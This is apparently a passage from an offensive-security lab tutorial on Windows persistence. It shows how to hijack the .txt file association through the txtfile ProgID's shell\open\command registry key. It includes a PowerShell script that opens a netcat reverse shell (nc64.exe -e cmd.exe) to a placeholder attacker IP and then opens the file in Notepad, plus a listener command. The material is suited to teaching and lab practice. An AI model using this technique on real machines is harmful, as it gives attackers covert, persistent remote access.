In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe {ATTACKER_IP} {port.number}"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```
Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`. So, by passing `$args[0]` to Notepad, you’re explicitly telling PowerShell to send the first argument it received when executing `notepad.exe`.This ensures that Notepad opens the correct file(our backdoor command) as specified by the user or another script.

Change the registry key to run our backdoor script in a hidden window:

Start an nc listener to receive our reverse shell on our attacker's machine:
```
user@AttackBox$ nc -lvp {port.number}
```
